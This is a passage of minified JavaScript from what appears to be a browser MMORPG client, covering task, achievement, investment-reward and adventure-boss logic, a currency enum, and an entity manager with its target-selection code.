null},e.prototype.getAchieveConfById=function(t){if(!this.achiTaskConfig){this.achiTaskConfig={};var e=s.GlobalConfig.AchievementTaskConfig;for(var i in e)this.achiTaskConfig[e[i].taskId]=e[i]}return this.achiTaskConfig[t]},e.prototype.getAwardsConfigById=function(t){var e,i=s.GlobalConfig.DailyAwardConfig;for(e in i){var n=i[e];if(n.id==t)return n}return null},e.prototype.getTaskStast=function(){if(this.dayTask){var t=void 0;for(t=0;t<this.dayTask.length;t++)if(1==this.dayTask[t].state)return void this.postUpdataTaskPoint(!0);for(t=0;t<this.vitalityAwards.length;t++){var e=this.getAwardsConfigById(this.vitalityAwards[t].id);if(this.vitality>=e.valueLimit&&0==this.vitalityAwards[t].state)return void this.postUpdataTaskPoint(!0)}for(t=0;t<this.achiEvement.length;t++)if(1==this.achiEvement[t].state)return void this.postUpdataTaskPoint(!0);return void this.postUpdataTaskPoint(!1)}},e.prototype.postUpdataTaskPoint=function(t){return t},e.prototype.sortTask=function(t){if(this.dayTask.length>2){this.dayTask.sort(this.sort);for(var e=[],i=0;i<this.dayTask.length;i++)0!=this.dayTask[i].state&&(e.push(this.dayTask[i]),this.dayTask.splice(i,1),i--);e.length>0&&(this.dayTask=this.dayTask.concat(e))}},e.prototype.sortWeekTask=function(t){if(this.weekTask.length>2){this.weekTask.sort(this.sort);for(var e=[],i=0;i<this.weekTask.length;i++)0!=this.weekTask[i].state&&(e.push(this.weekTask[i]),this.weekTask.splice(i,1),i--);e.length>0&&(this.weekTask=this.weekTask.concat(e))}},e.prototype.sort=function(t,e){return n.Algorithm.sortAsc(t.id,e.id)},e.prototype.sortAchiEvement=function(){for(var t=0;t<this.achiEvement.length;t++){var e=this.achiEvement[t];1==e.state?(this.achiEvement.splice(t,1),this.achiEvement.unshift(e)):2==e.state&&(this.achiEvement.splice(t,1),this.achiEvement.push(e))}},e.prototype.getIsOpenChengjiu=function(){return a.ActorCC.level>=7},e.prototype.getIsHaveChengjiuReward=function(){if(!this.getIsOpenChengjiu())return!1;for(var t=e.ins().getAllExAchievementType(),i=0,n=t;i<n.length;i++){var o=n[i],s=this.getChengjiuDataByType(o);if(void 0==s)return void console.log("是否有成就奖励可领取 datas = null");for(var a=0,r=s;a<r.length;a++){var l=r[a];if(1==l.state)return!0}}return!1},e.prototype.getIsHaveChengjiuRewardBytype=function(t){for(var e=this.getChengjiuDataByType(t),i=0,n=e;i<n.length;i++){var o=n[i];if(1==o.state)return!0}return!1},e.prototype.getTaskState=function(){var t=this.taskTrace;if(t){var e=this.getAchieveConfById(t.id+1);return e||2!=t.state?!0:!1}return!1},e.prototype.getLimitTaskRed=function(){for(var t=0;t<this.limitTaskList.length;t++)if(1==this.limitTaskList[t].state)return 1;return 0},e.prototype.postParabolicItem=function(){},e.prototype.getLimitTimeId=function(t){for(var e in s.GlobalConfig.LimitTimeConfig){var i=s.GlobalConfig.LimitTimeConfig[e];
if(-1!=i.taskIds.indexOf(t))return i.id}return 0},e.prototype.sendInvestmentTaskData=function(t,e,i){var n=this.getBytes(12);n.writeShort(t),n.writeInt(e),i&&n.writeByte(i),this.sendToServer(n)},e.prototype.postInvestmentTaskData=function(t){var e=t.readShort();this.investmentAllTask=[];for(var i=0;e>i;i++){var n=t.readInt(),o={cfgId:n,overTime:t.readInt(),tasks:this.parserInvestmentTask(t,n),activityId:0};this.investmentAllTask[o.cfgId]=o;var a=t.readInt(),h=t.readInt();o.activityId=h;var u=r.Activity.ins().activityData[h];if(u)u.update(t);else switch(a){case l.ActivityDataType._41:var p=s.GlobalConfig.ActivityConfig[h];u=new m.ActivityType41Data(t),u.id=h,u.pageStyle=null===p||void 0===p?void 0:p.pageStyle,u.pageSkin=null===p||void 0===p?void 0:p.pageSkin,r.Activity.ins().activityData[h]=u;break;default:t.readByte(),t.readByte(),t.readInt()}}r.Activity.ins().postActivityIsGetAwards()},e.prototype.isHasActivity=function(){return 0==this.investmentAllTask.length?!1:!0},e.prototype.parserInvestmentTask=function(t,e){for(var i,n=t.readInt(),o=[],a=0;n>a;a++){var r={taskIndex:t.readShort(),param:t.readInt(),status:0,isAct:!1,free:0,pay:0},l=t.readByte(),h=t.readByte(),u=t.readByte(),p=1&l,d=l>>1&1;r.free=h,r.pay=u;var c=s.GlobalConfig.InvestmentTaskConfig[e]&&(null===(i=s.GlobalConfig.InvestmentTaskConfig[e][r.taskIndex])||void 0===i?void 0:i.target)||0;r.status=1==p?2:r.param<c?0:1,r.isAct=1==d,o[r.taskIndex]=r}return o},e.prototype.postOneInvestmentTask=function(t){var e,i=t.readUnsignedInt(),n=t.readUnsignedShort(),o=t.readInt(),a=t.readByte(),l=t.readByte(),h=t.readByte(),u=this.getInvestmentTask(i,n);if(u){var p=s.GlobalConfig.InvestmentTaskConfig[i]&&(null===(e=s.GlobalConfig.InvestmentTaskConfig[i][u.taskIndex])||void 0===e?void 0:e.target)||o+1;u.param=o,u.status=1==a?2:u.param<p?0:1,u.free=l,u.pay=h,r.Activity.ins().postActivityIsGetAwards()}},e.prototype.postCloseInvestmentTask=function(t){var e=t.readUnsignedInt(),i=this.getInvestmentAllTask(e);if(i){var n=i.activityId;r.Activity.ins().activityData[n]=null,delete r.Activity.ins().activityData[n],r.Activity.ins().postActivityIsGetAwards()}},e.prototype.getInvestmentAllTask=function(t){return this.investmentAllTask[t]},e.prototype.checkJiJinRewardIsEnd=function(){var t=r.Activity.ins().activityData[28];if(!t||!(null===t||void 0===t?void 0:t.hasBuy))return!1;var i=s.GlobalConfig.ActivityType41Config[28],n=y.CommonUtils.objectToArray(s.GlobalConfig.InvestmentTaskConfig[i.taskid]),o=0,a=0,l=0;for(var h in n){o++;var u=n[h],p=e.ins().getInvestmentTask(u.id,u.index);p&&(p.free&&1==p.free&&a++,2==p.status&&l++)}return a>=o&&l>=o},e.prototype.getInvestmentTask=function(t,e){var i=this.getInvestmentAllTask(t);return i&&i.tasks?i.tasks[e]:null},e.prototype.initRed=function(){var t=this;this.jijinRed=new C.RedPoint(function(){if(window.platform.isshen())return!1;var e=t.investmentAllTask[3],i=r.Activity.ins().activityData[28];if(!i)return!1;if(!e)return!1;for(var n=0;n<e.tasks.length;n++)if(e.tasks[n])switch(e.tasks[n].status){case 0:break;case 1:if(null===i||void 0===i?void 0:i.hasBuy)return!0;case 2:if(0==e.tasks[n].free)return!0}return!1},this.postInvestmentTaskData,r.Activity.ins().postActivityIsGetAwards),this.zhanlingRed=new C.RedPoint(function(){if(window.platform.isshen())return!1;var e=t.investmentAllTask[2],i=r.Activity.ins().activityData[27];if(!i)return!1;if(!e)return!1;for(var n=0;n<e.tasks.length;n++)if(e.tasks[n])switch(e.tasks[n].status){case 0:break;case 1:if(null===i||void 0===i?void 0:i.hasBuy)return!0;case 2:if(0==e.tasks[n].free)return!0;if((null===i||void 0===i?void 0:i.ybhasBuy)&&0==e.tasks[n].pay)return!0}return!1},this.postInvestmentTaskData,r.Activity.ins().postActivityIsGetAwards),this.dayTaskRed=new C.RedPoint(function(){for(var e=s.GlobalConfig.DailyAwardConfig,i=0;i<t.dayTask.length;i++){var n=t.dayTask[i],o=1==n.state;if(o)return!0}for(var i=0;i<t.vitalityAwards.length;i++){var a=t.vitalityAwards[i],r=e[i+1];if(r){var o=1!=a.state&&r.valueLimit<=t.vitality;if(o)return!0}}return!1},e.ins().postTaskChangeData),this.weekTaskRed=new C.RedPoint(function(){for(var e=s.GlobalConfig.WeekAwardConfig,i=0;i<t.weekTask.length;i++){var n=t.weekTask[i],o=1==n.state;if(o)return!0}for(var i=0;i<t.weekVitalityAwards.length;i++){var a=t.weekVitalityAwards[i],r=e[i+1];if(r){var o=1!=a.state&&r.valueLimit<=t.weekVitality;if(o)return!0}}return!1},e.ins().postWeekTaskChangeData)},e.prototype.initTitleRp=function(){var t=this;this.titleTaskRed=new C.RedPoint(function(){return t.checkTitleRp()},e.ins().postTitleTaskInfo)},e.prototype.checkTitleRp=function(){for(var t,e,i=s.GlobalConfig.TitleTaskConfig,n=s.GlobalConfig.TitleConf,o=0;o<this.titleTasks.length;o++){var a=this.titleTasks[o],r=i[a.id];if(r){var l=r.target&&a.value>=r.target,h=(null===(t=n[r.title])||void 0===t?void 0:t.activeItemId)&&!!w.BagCT.ins().getBagGoodsCountById(w.BagCT.BAG_TYPE_OTHTER,null===(e=n[r.title])||void 0===e?void 0:e.activeItemId),u=1==a.state;if(l&&!u||h&&!u)return!0}}return!1},e.prototype.initTaskRp=function(){var t=this;this.taskRp=new C.RedPoint(function(){return t.redAllExperienceTask()},this.changeAchieve,this.postUpdateAchieve)},e.prototype.getTaskList=function(){var t=[];return(this.taskTrace?2==this.taskTrace.state:1)||1e3==this.taskTrace.achievementId&&t.push(this.taskTrace),t},e.prototype.getAllAchievementTaskCfg=function(){if(this.experienceTaskAllConfig&&0!=this.experienceTaskAllConfig.length)return this.experienceTaskAllConfig;this.experienceTaskAllConfig=[];var t=s.GlobalConfig.AchievementTaskConfig;for(var i in s.GlobalConfig.AchievementTaskConfig)1e3!=t[i].achievementId&&this.experienceTaskAllConfig.push(t[i]);return this.experienceTaskAllConfig.sort(e.sort),this.experienceTaskAllConfig},e.sort=function(t,e){return t.achievementType>e.achievementType?1:t.achievementType<e.achievementType?-1:0},e.prototype.getAchievementTaskCfgByType=function(t){for(var e=this.getAllAchievementTaskCfg(),i=[],n=0,o=e;n<o.length;n++){var s=o[n];s.achievementType==t&&i.push(s)}return i},e.prototype.getAllExAchievementType=function(){if(this.exAchievementType)return this.exAchievementType;this.exAchievementType=[];for(var t=this.getAllAchievementTaskCfg(),e=-1,i=0,n=t;i<n.length;i++){var o=n[i];e!=o.achievementType&&(e=o.achievementType,this.exAchievementType.push(e))}return this.exAchievementType},e.prototype.getIsAllExRewardBytype=function(t){var e=this.getChengjiuDataByType(t);if(!e||0==e.length)return!1;for(var i=0,n=e;i<n.length;i++){var o=n[i];if(2!=o.state)return!1}return!0},e.prototype.isExOpen=function(t){var e=this.exAchievementType.indexOf(t);if(0==e)return!0;var i=this.exAchievementType[e-1],n=this.getIsAllExRewardBytype(i);return n},e.prototype.getMaxActivity=function(t){var e=0==t?s.GlobalConfig.DailyAwardConfig:s.GlobalConfig.WeekAwardConfig;if(!e)return 0;var i=y.CommonUtils.getObjectLength(e),n=e[i].valueLimit;return n},e.prototype.sendWeekGetTask=function(t){var e=this.getBytes(15);e.writeInt(t),this.sendToServer(e)},e.prototype.sendGetdWeekVitalityAwards=function(t){var e=this.getBytes(16);e.writeInt(t),this.sendToServer(e)},e.prototype.doWeekTaskData=function(t){this.weekTask=[],this.weekVitalityAwards=[];for(var e=t.readInt(),i=0;e>i;i++){var n=new f.TaskData;n.id=t.readInt(),n.value=t.readInt(),n.state=t.readInt(),this.weekTask.push(n)}this.weekVitality=t.readInt();for(var o=t.readInt(),i=0;o>i;i++){var s=new g.VitalityData;s.id=t.readInt(),s.state=t.readInt(),this.weekVitalityAwards.push(s)}this.weekVitalityAwards.sort(function(t,e){return t.id<e.id?-1:1}),this.sortWeekTask(),this.postWeekTaskChangeData()},e.prototype.doWeekTaskChangeData=function(t){var e=t.readInt(),i=this.getTaskDataById(e,1);i&&(i.value=t.readInt(),i.state=t.readInt(),this.sortWeekTask(),this.postWeekTaskChangeData())},e.prototype.redAllExperienceTask=function(){for(var t=this.getAllExAchievementType(),e=0;e<t.length;e++){var i=t[e];if(this.redExperienceTask(i))return!0}return!1},e.prototype.redExperienceTask=function(t){var e=this.isExOpen(t);if(!e)return!1;for(var i=this.getAchievementTaskCfgByType(t),n=0;n<i.length;n++){var o=i[n],s=this.getTaskData(o.achievementId,o.taskId);if(!s)return!1;if(1==s.state)return!0}return!1},e.prototype.updateTitle=function(t){this.apparelTaskId=this.getTitleTaskIdByTitleId(t)},e.prototype.postWeekTaskChangeData=function(){},e.prototype.viewShowChapter=function(t){return t},e.prototype.viewChangeTab=function(){},Object.defineProperty(e.prototype,"apparelId",{get:function(){var t=s.GlobalConfig.TitleTaskConfig[this.apparelTaskId],e=t?t.title:0;return e},enumerable:!1,configurable:!0}),e.prototype.doWeekVitality=function(t){this.weekVitality=t.readInt(),this.postWeekTaskChangeData()},e.prototype.doWeekVitalityAwards=function(t){var e=t.readInt(),i=this.getVitalityAwardsById(e,1);i.state=t.readInt(),this.postWeekTaskChangeData()},e.prototype.doTitleTaskInfo=function(t){this.apparelTaskId=t.readInt();var e=t.readInt();this.titleTasks=[];for(var i=0;e>i;i++){var n=new f.TaskData;n.parser(t),this.titleTasks.push(n)}var o=s.GlobalConfig.TitleTaskConfig,a=s.GlobalConfig.TitleConf;this.totalAttrs={};for(var i=0;i<this.titleTasks.length;i++){var r=this.titleTasks[i],l=o[r.id];if(l&&1==r.state)for(var h=a[null===l||void 0===l?void 0:l.title],u=h.attrs,p=0;p<u.length;p++){var d=u[p];this.totalAttrs[d.type]?this.totalAttrs[d.type].value+=d.value:(this.totalAttrs[d.type]=new b.AttributeData,this.totalAttrs[d.type].type=d.type,this.totalAttrs[d.type].value=d.value)}}this.postTitleTaskInfo()},e.prototype.getDirListData=function(t){for(var i=s.GlobalConfig.TitleTaskConfig,n=t.dir,o=[],a=0;a<n.length;a++){var r=n[a],l=i[r],h=e.ins().getTitleTaskById(r);if(l){var u=s.GlobalConfig.TitleConf[l.title],p=S.Title.ins().timeDict[l.title],d=!1;if(1==u.defaultShow||p)d=!0;else if(0==u.defaultShow){var c=h?h.value:0,f=h?h.state:0,g=l.target&&c>=l.target,m=1==f,v=g&&!m||!m&&u.activeItemId&&!!w.BagCT.ins().getBagGoodsCountById(w.BagCT.BAG_TYPE_OTHTER,u.activeItemId);(v||h&&h.state)&&(d=!0)}d&&o.push({id:l.id,desc:l.desc,target:l.target,taskName:l.name,rare:u.rare,activeItemId:u.activeItemId,value:h?h.value:0,state:h?h.state:0})}}return o},e.prototype.postSubTitle=function(){},e.prototype.sendTitleTask=function(){var t=this.getBytes(19);this.sendToServer(t)},e.prototype.sendTitle=function(t,e){var i=this.getBytes(20);i.writeByte(t),i.writeInt(e),this.sendToServer(i)},e.prototype.getTitleTaskById=function(t){for(var e=0;e<this.titleTasks.length;e++){var i=this.titleTasks[e];if(i.id==t)return i}return null},e.prototype.sendQiyuInfo=function(t){void 0===t&&(t=0);var e=this.getBytes(21);e.writeInt(t),this.sendToServer(e)},e.prototype.doQiyuInfo=function(t){for(var e=t.readInt(),i=0;e>i;i++){var n=t.readInt(),o=t.readInt(),s=t.readInt(),a=t.readInt();this.qiyuData.push({uid:n,id:o,endTime:s,fubenID:a})}},e.prototype.doQiyuInfoDelete=function(t){for(var e=t.readInt(),i=0;i<this.qiyuData.length;i++)this.qiyuData[i].uid==e&&this.qiyuData.splice(i,1)},e.prototype.getTitleTaskIdByTitleId=function(t){var e=s.GlobalConfig.TitleTaskConfig;for(var i in e){var n=e[i];if(n.title==t)return n.id}return 0},e.prototype.postTitleTaskInfo=function(){},e.prototype.postTitleChange=function(){},e.prototype.taskSort=function(){},e.prototype.reqQiyuBossInfo=function(){var t=this.getBytes(23);this.sendToServer(t)},e.prototype.qiyuBossInfoBack=function(t){var e=t.readByte(),i=0,n=0,o=0,s=0,r=0,l=0;0==e||(i=t.readInt(),n=t.readShort(),o=I.DateUtils.formatMiniDateTime(t.readInt()),s=t.readByte(),r=t.readByte(),l=t.readDouble()),this.qiyuBossInfo={hasQiyuBoss:e,touchoffPlayerId:i,qiyuBossCfgId:n,qiyuBossEndTime:o,ackTimes:s,buyTimes:r,allHurt:l},this._showedTouchoffEffDic||(this._showedTouchoffEffDic={}),this.qiyuBossInfo.touchoffPlayerId!=a.ActorCC.actorID||this._showedTouchoffEffDic[this.qiyuBossInfo.qiyuBossEndTime]||0!=this.qiyuBossInfo.ackTimes||(win.open(_.QiyuBossTouchoffWin),this._showedTouchoffEffDic[this.qiyuBossInfo.qiyuBossEndTime]=!0),this.postQiyuBossIfo()},e.prototype.checkQiyuBossOpen=function(){return this.qiyuBossInfo&&this.qiyuBossInfo.hasQiyuBoss>0?!0:!1},e.prototype.reqQiyuBossHurtRank=function(){var t=this.getBytes(24);this.sendToServer(t)},e.prototype.qiyuBossHurtRankBack=function(t){this.qiyuBossHurtRankList=[];for(var e=t.readShort(),i=0;e>i;i++){var n={rank:t.readShort(),actorId:t.readInt(),actorName:t.readString(),hurt:t.readDouble()};this.qiyuBossHurtRankList.push(n)}this.postQiyuBossRankInfo()},e.prototype.reqJoinQiyuBoss=function(){var t=this.getBytes(25);this.sendToServer(t)},e.prototype.syncQiyuBossInfo=function(t){this.qiyuBossSyncInfo={hpCnt:t.readShort(),hurtedCnt:t.readDouble()},this.postQiyuBossSyncInfo()},e.prototype.reqByQiyuBossTimes=function(){var t=this.getBytes(27);this.sendToServer(t)},e.prototype.getReachRewardList=function(t){var e=[],i=1,n=s.GlobalConfig.AdventureBossDamageConfig[t][i];for(n&&e.push(n);;){if(i++,n=s.GlobalConfig.AdventureBossDamageConfig[t][i],!n)break;e.push(n)}return e},e.prototype.getMaxBuyCnt=function(t){var e=s.GlobalConfig.AdventureBossConfig[t],i=0;if(e&&e.buyCosts)for(var n in e.buyCosts)isNaN(+n)||i++;return i},e.prototype.getQiyuBossJieProgress=function(t,e){var i=[],n=1,o=s.GlobalConfig.AdventureBossDamageConfig[t][n];for(o&&i.push(o);;){if(n++,o=s.GlobalConfig.AdventureBossDamageConfig[t][n],!o)break;i.push(o)}i=i.sort(function(t,e){return t.idx-e.idx});for(var a=i.length-1;a>=0;a--)if(o=i[a],e>=o.damage)return{curPro:e,maxPro:o.damage,index:a+1,cfg:o};return{curPro:e,maxPro:i[0].damage,index:1,cfg:i[0]}},e.prototype.postQiyuBossIfo=function(){},e.prototype.postQiyuBossIfo1=function(){},e.prototype.postQiyuBossRankInfo=function(){},e.prototype.postQiyuBossSyncInfo=function(){},__decorate([post()],e.prototype,"onEncounterTaskData",null),__decorate([post()],e.prototype,"postTaskChangeData",null),__decorate([post()],e.prototype,"postUpdateAchieve",null),__decorate([post()],e.prototype,"postUpdteTaskTrace",null),__decorate([post()],e.prototype,"postUpdteLimitTaskData",null),__decorate([post()],e.prototype,"changeAchieve",null),__decorate([post()],e.prototype,"postUpdataTaskPoint",null),__decorate([post()],e.prototype,"postParabolicItem",null),__decorate([post()],e.prototype,"postInvestmentTaskData",null),__decorate([post()],e.prototype,"postOneInvestmentTask",null),__decorate([post()],e.prototype,"postCloseInvestmentTask",null),__decorate([post()],e.prototype,"postWeekTaskChangeData",null),__decorate([post()],e.prototype,"viewShowChapter",null),__decorate([post()],e.prototype,"viewChangeTab",null),__decorate([post()],e.prototype,"postSubTitle",null),__decorate([post()],e.prototype,"doQiyuInfo",null),__decorate([post()],e.prototype,"doQiyuInfoDelete",null),__decorate([post()],e.prototype,"postTitleTaskInfo",null),__decorate([post()],e.prototype,"postTitleChange",null),__decorate([post()],e.prototype,"postQiyuBossIfo",null),__decorate([post()],e.prototype,"postQiyuBossIfo1",null),__decorate([post()],e.prototype,"postQiyuBossRankInfo",null),__decorate([post()],e.prototype,"postQiyuBossSyncInfo",null),e}(o.BaseSystem);e.TaskCT=x,window.TaskCT=x,__reflect(x.prototype,"TaskCT",[]),Systemap.TaskCT=function(){return x.ins()},window.TaskCT=x},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MoneyConst=void 0;var n;!function(t){t[t.exp=0]="exp",t[t.gold=1]="gold",t[t.yuanbao=2]="yuanbao",t[t.guildGx=5]="guildGx",t[t.rune=9]="rune",t[t.stone=21]="stone",t[t.crossDartCarScore=22]="crossDartCarScore",t[t.skillPoints=24]="skillPoints"}(n=e.MoneyConst||(e.MoneyConst={})),window.MoneyConst=n,window.MoneyConst=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EntityManager=void 0;var n=i(50),o=i(178),s=i(16),a=i(70),r=i(13),l=i(20),h=i(23),u=i(137),p=i(288),d=i(193),c=i(0),f=i(95),g=i(53),m=function(t){function e(){var i=t.call(this)||this;return i.killMeHandle={},i.entityList={},i.transferList={},i.mineList={},i._masterList={},i.tempSelect={},observe(i,function(t){var n=e.ins().getEntityByHandle(t);return n&&n.data.isMy?void console.error("服务器发送了自身（包括队友等）伤害bug过来"):void(i.killMeHandle[t]=1)},Ts.killMeHandle),observe(i,function(){i.killMeHandle={}},Ts.enterScene),i}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.checkIsInKillMeList=function(t){return this.killMeHandle[t]?1==this.killMeHandle[t]:!1},e.prototype.setKillMeListFalse=function(t){this.killMeHandle[t]&&(this.killMeHandle[t]=0)},e.prototype.getAllEntity=function(){return this.entityList},e.prototype.addList=function(t){if(t.infoModel.handle||(t.infoModel.handle=t.hashCode),this.entityList[t.infoModel.handle]!=t){if(this.entityList[t.infoModel.handle]=t,t instanceof d.Entity||(console.error("@@char不是Entity!!!!"),console.groupCollapsed(),console.trace(),console.groupEnd()),t.infoModel.masterHandle){var e=t.infoModel.masterHandle;this._masterList[e]||(this._masterList[e]=[]),this._masterList[e].push(t)}t.infoModel.type==EntityType.Mine&&(this.mineList[t.infoModel.index]=t)}},e.prototype.addTransfer=function(t){this.transferList[t.infoModel.configID]=t,o.SkillEffPlayer.bottomLayer.addChild(t)},e.prototype.removeTransferById=function(t){var e=this.transferList[t];e&&(delete this.transferList[t],s.DisplayUtils.removeFromParent(e))},e.prototype.getTransferById=function(t){return this.transferList[t]},e.prototype.getMineByIndex=function(t){return this.mineList[t]},e.prototype.createEntity=function(t,e){switch(t.type){case EntityType.Role:case EntityType.LadderPlayer:var i=d.Entity.create(t);return this.addList(i),i;case EntityType.Pet:var n=d.Entity.create(t);return this.addList(n),n;case EntityType.Monster:case EntityType.Ring:case EntityType.CollectionMonst:case EntityType.Fire:var o=d.Entity.create(t);return this.addList(o),o;case EntityType.DropItem:var s=ObjectPool.pop("CharItem2");return s.infoModel=t,this.addList(s),s;case EntityType.MuBei:var a=ObjectPool.pop("CharImage");return a.infoModel=t,this.addList(a),a;case EntityType.Transfer:var r=ObjectPool.pop("CharTransfer");return r.infoModel=t,this.addTransfer(r),r.updateModel(),r;case EntityType.Npc:var l=ObjectPool.pop("CharNpc");return l.infoModel=t,this.addList(l),l.updateModel(),l}return console.warn("不能创建实体类型--",t.type),null},e.prototype.removeAll=function(){for(var t in this.entityList)this.removeByHandle(t);for(var t in this.transferList)this.removeTransferById(t);this.entityList={},this._masterList={},this.transferList={}},e.prototype.removeByHandle=function(t,e,i){var n,o,a,r;void 0===e&&(e=!0),void 0===i&&(i=!1);var p=this.entityList[t];if(p||(null===p||void 0===p?void 0:p.infoModel)){var d=null===(n=null===p||void 0===p?void 0:p.infoModel)||void 0===n?void 0:n.masterHandle;if(d){for(var c=this._masterList[d],f=0;c&&f<c.length;f++)if(c[f]==p){c.splice(f,1);break}c&&0==c.length&&delete this._masterList[d]}delete this.entityList[t];for(var f in this.entityList)(null===(o=this.entityList[f].infoModel)||void 0===o?void 0:o.masterHandle)&&(null===(a=this.entityList[f].infoModel)||void 0===a?void 0:a.masterHandle)==t&&this.removeByHandle(this.entityList[f].infoModel.handle);return u.DropHelp.tempDropPoint.x=Math.floor(p.x/l.GameMap.CELL_SIZE),u.DropHelp.tempDropPoint.y=Math.floor(p.y/l.GameMap.CELL_SIZE),l.GameMap.sceneInMain()&&p.infoModel.type==EntityType.Monster&&i&&h.GameLogic.ins().postExpMc(p),(null===(r=null===p||void 0===p?void 0:p.infoModel)||void 0===r?void 0:r.type)==EntityType.Mine&&delete this.mineList[p.infoModel.index],e&&s.DisplayUtils.removeFromParent(p),p}},e.prototype.getEntityByHandle=function(t){return this.entityList[t]},e.prototype.getMasterList=function(t){return this._masterList[t]},Object.defineProperty(e.prototype,"masterList",{get:function(){return this._masterList},enumerable:!1,configurable:!0}),e.prototype.getRootMasterHandle=function(t){var e=this.getEntityByHandle(t);return e&&e.infoModel&&e.infoModel.masterHandle>0&&e.infoModel.masterHandle!=t?this.getRootMasterHandle(e.infoModel.masterHandle):t},e.prototype.getMainRole=function(t){return this.getEntityByHandle(r.SubRoles.ins().getSubRoleByIndex(t).handle)},e.prototype.getJobMainRole=function(t){var e,i=0;for(var n in r.SubRoles.ins().jobDic){if(i==t){e=r.SubRoles.ins().jobDic[n];break}i++}return this.getEntityByHandle(e.handle)},e.prototype.getEntityBymasterhHandle=function(t){for(var e in this.entityList)if(this.entityList[e].infoModel&&this.entityList[e].infoModel.masterHandle&&this.entityList[e].infoModel.masterHandle==t&&this.entityList[e].infoModel.type!=EntityType.Monster)return this.entityList[e];return null},e.prototype.getEntitysBymasterhHandle=function(t,e){void 0===e&&(e=-1);var i=[];for(var n in this.entityList){if(i.length>=3)return i;this.entityList[n].infoModel&&this.entityList[n].infoModel.masterHandle&&this.entityList[n].infoModel.masterHandle==t&&(-1==e||e==this.entityList[n].infoModel.type)&&i.push(this.entityList[n])}return i},e.prototype.getEntityByMonsterId=function(t){var e=[];if(void 0==t)return e;for(var i in this.entityList)this.entityList[i].infoModel&&this.entityList[i].infoModel.configID==t&&e.push(this.entityList[i]);return e},e.prototype.find=function(t,e,i,n,o,s,a){void 0===i&&(i=p.TargetType.Enemy),void 0===n&&(n=!1),void 0===o&&(o=!0),void 0===s&&(s=null);var r,l=this.findAll(t,e,i,o,s,a);if(n)r=e==EntityType.Monster&&i==p.TargetType.Enemy&&g.ControlCC.isAutoSelHighQuaMon?this.findMaxQualityMon(l,a):l[0];else if(e==EntityType.Monster&&i==p.TargetType.Enemy&&g.ControlCC.isAutoSelHighQuaMon)r=this.findMaxQualityMon(l,a),!r&&l.length&&(r=this.find(t,e,i,n,o,s,a));else{for(var h=0,u=l;h<u.length;h++){var d=u[h],c=d.infoModel.handle;if(!this.tempSelect[c]){this.tempSelect[c]=1,r=d;break}}!r&&l.length&&(this.tempSelect={},r=this.find(t,e,i,n,o,s,a))}return r},e.prototype.findMaxQualityMon=function(t,e){var i;if(!t||0==t.length)return null;if(1==t.length)return t[0];for(var n=[],o=0,s=t;o<s.length;o++){var a=s[o],l=c.GlobalConfig.MonstersConfig[null===(i=null===a||void 0===a?void 0:a.infoModel)||void 0===i?void 0:i.configID];l&&n.push({priority:0,target:a,quality:l.quality})}n.sort(this.sortFunc);for(var h,u=n.length,p=0;u>p;){var d=g.ControlCC.getDis({gridX:r.SubRoles.lookAtTar.infoModel.gridX,gridY:r.SubRoles.lookAtTar.infoModel.gridY},{gridX:n[p].target.infoModel.gridX,gridY:n[p].target.infoModel.gridY});if(e>=d){h=n[p].target;break}if(g.ControlCC.getOneStep({gridX:n[p].target.infoModel.gridX,gridY:n[p].target.infoModel.gridY},r.SubRoles.lookAtTar,n[p].target,e)){h=n[p].target;break}p++}return h},e.prototype.findAll=function(t,e,i,n,o,s){void 0===i&&(i=p.TargetType.Enemy),void 0===n&&(n=!0),void 0===o&&(o=null),void 0===s&&(s=1);var l=[];for(var h in this.entityList){var u=this.entityList[h];if(u&&(null===u||void 0===u?void 0:u.infoModel)&&u.infoModel.type!=EntityType.CollectionMonst&&!u.infoModel.isStealth){var d=u.infoModel,m=d.configID,v=d.type,y=(d.isMy,d.handle),C=(d.guildID,c.GlobalConfig.MonstersConfig[m]);if((null===C||void 0===C?void 0:C.type)!=f.MonsterType.MonsterType_Fire&&(null===C||void 0===C?void 0:C.type)!=f.MonsterType.MonsterType_GatherMonster&&(null===C||void 0===C?void 0:C.type)!=f.MonsterType.Ring&&v!=EntityType.Ring&&(e==EntityType.All||v==e)&&!u.isDie()){if(i==p.TargetType.My)return[t];if(i==p.TargetType.Friendly){if(!u.infoModel.isFriend())continue}else if(u.infoModel.isFriend())continue;if(!this.killMeHandle[y],!o||o(u)){if(i==p.TargetType.Enemy){var T=g.ControlCC.getDis({gridX:t.infoModel.gridX,gridY:t.infoModel.gridY},{gridX:u.infoModel.gridX,gridY:u.infoModel.gridY})<=s;if(!T&&!g.ControlCC.getOneStep({gridX:u.infoModel.gridX,gridY:u.infoModel.gridY},r.SubRoles.lookAtTar,u,s))continue}l.push({priority:a.MathUtils.getDistanceX2ByObject({x:t.data.gridX,y:t.data.gridY},{x:u.data.gridX,y:u.data.gridY}),target:u,quality:(null===C||void 0===C?void 0:C.quality)||0})}}}}l.sort(this.sortFunc);for(var b=[],w=0;w<l.length;w++)b[w]=l[w].target;return b},e.prototype.sortFunc=function(t,e){return t.priority>e.priority?1:t.priority<e.priority?-1:t.quality<e.quality?1:t.quality>e.quality?-1:0},e.prototype.findNeedAddHpTar=function(){var t=this.entityList;for(var e in t){var i=t[e];if(i&&i.infoModel&&!i.isDie()&&i.infoModel.isFriend()){var n=i.infoModel.hp,o=i.infoModel.hp_max;if(Math.min(n,o)/o<.8)return i}}return null},e.prototype.checkEntityCanBeHeal=function(t){if(!t||!t.infoModel||t.isDie())return!1;if(t.infoModel.isFriend()){var e=t.infoModel.hp,i=t.infoModel.hp_max;if(Math.min(e,i)/i<.8)return!0}return!1},e.prototype.findOtherTar=function(){var t=this.entityList;for(var e in t){var i=t[e];if(i&&(null===i||void 0===i?void 0:i.infoModel)&&!i.infoModel.isMy&&i.infoModel.type==EntityType.Role)return i}return null},e.prototype.isPet=function(t){var e=this.entityList[t];if(!e)return!1;var i=e.data;return i&&i.isPet()?!0:!1},e.CHAR_DEFAULT_HEIGHT=130,e.CHAR_DEFAULT_TYPEFACE=110,e}(n.BaseClass);e.EntityManager=m,window.EntityManager=m,__reflect(m.prototype,"EntityManager",[]),window.EntityManager=m},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipCT=void 0;var 